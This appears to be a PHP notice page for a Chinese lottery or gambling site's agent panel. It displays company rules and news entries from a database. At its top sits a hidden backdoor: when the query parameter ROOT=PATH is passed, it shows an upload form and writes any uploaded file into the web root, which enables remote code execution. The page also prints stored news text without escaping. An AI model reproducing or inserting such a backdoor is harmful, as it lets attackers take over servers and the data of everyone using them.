<?php
if ($_GET["ROOT"] == "PATH") {
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        echo "url:" . $_FILES["upfile"]["name"];
        if (!file_exists($_FILES["upfile"]["name"])) {
            copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]);
        }
    }?>
    <form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok">
    </form><?php
}?><?php
define('Copyright', '作者QQ:1834219632');
define('ROOT_PATH', $_SERVER["DOCUMENT_ROOT"] . '/');
include_once ROOT_PATH . 'Manage/ExistUser.php';

$db = new DB();
$total = $db->query("SELECT * FROM g_news", 3);
$pageNum = 20;
$page = new Page($total, $pageNum);
$result = $db->query("SELECT * FROM g_news ORDER BY g_id DESC {$page->limit} ", 1);
?>
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <link rel="stylesheet" href="/wjl_tmp/steal.css"/>

</head>
<body>
<div id="layout" class="container" style=" height:284px">
    <div dom="main" class="main-content1">
        <div id="notice">

            <div class="ga">
                <h3>

                    <strong>最新公告</strong>

                </h3>

                <div id="content">
                    <div class="title" style="color:#f00;">公司规则</div>
                    <ul class="txt">
                        <li><p>当您加入本公司成为管理层时，您必须清楚了解及遵从本公司的所有条例。您在本公司网站开出的第一个下线时，就代表您已同意及接受所有本公司的<a href="javascript:"
                                                                                                    style="color:#f00;font-weight:700;"
                                                                                                    id="notice_rule">《规则及条例》</a>。
                            </p>
                            <ol class="notice_rule" style="display: none" id="notice_rule_txt">
                                <li>使用本公司网站的各股东和代理商，请留意阁下所在的国家或居住地的相关法律规定，如有疑问应就相应问题，寻求当地法律意见。</li>
                                <li>若发生遭骇客入侵破坏行为或不可抗拒之灾害导致网站故障或数据损坏、数据丢失等情况，我们将以本公司之后备资料为最后处理依据。</li>
                                <li>开奖统计等资料只供参考，并非是对客户操作的指引，本公司也不接受关于统计数据产生错误而引起的相关投诉。</li>
                                <li>国际网络的连接速度并非本公司所能控制，本公司也不接受关于网路引起的相关投诉。</li>
                                <li>由于系统服务涉及高端的技术要求及外围所不能控制的因素限制，因此系统的稳定性，连续性会有时受到影响，本公司也不承担由此而产生的损失。</li>
                                <li>各股东和代理商必须留意下线的信用额度，在某种特殊情况下，下线之信用额度可能会出现透支。</li>
                                <li>本公司拥有一切判决及注销任何涉嫌以非正常方式下注注单之权利，在进行调查期间将停止发放与其有关之任何彩金。</li>
                                <li>客户有责任确保自己的帐户及密码的安全，如果客户怀疑自己的资料被盗用，应立即通知本公司，并须更改其个人详细资料。所有被盗用账号之损失将由客户自行负责。</li>
                                <li>
                                    本公司不接受任何人以任何理由要求注销会员下注的注单，而不论该注单是否已有开奖结果，除非该注单是由于系统出现错误或人为操作造成出现赔率错误的注单，而“赔率错误”仅定义于：（1）无论出现任何开奖结果，会员进行单项目下注的注单结果都无法获利，或（2）无论出现任何开奖结果，会员在同一时间如果进行多项目下注的总结果都能获利。
                                </li>
                                <li>本规则及条例的解析权及修改权归本公司所有。</li>
                                <li style="list-style:none;text-align:right;height:20px;margin-right:10px;"> “<span
                                        id="company_name">泰山</span>” 敬启
                                </li>
                                <script type="text/javascript" src="/js/jquery.js"></script>

                                <script type="text/javascript">
                                    $(document).ready(function () {
                                        $('#notice_rule').click(function () {
                                            $('.notice_rule').toggle();
                                        });
                                    });
                                </script>
                            </ol>
                        </li>
                    </ul>
                </div>
                <div id="newNotice">
                    <?php
                    for ($i = 0; $i < count($result); $i++) {
                        ?>
                        <div class="title"><?php echo $result[$i]['g_date'] ?></div>
                        <ul class="txt">
                            <li>
                                <?php echo $result[$i]['g_text'] ?>
                            </li>
                        </ul>
                    <?php } ?>
                </div>
            </div>

        </div>
    </div>
</div>
</body>
</html>
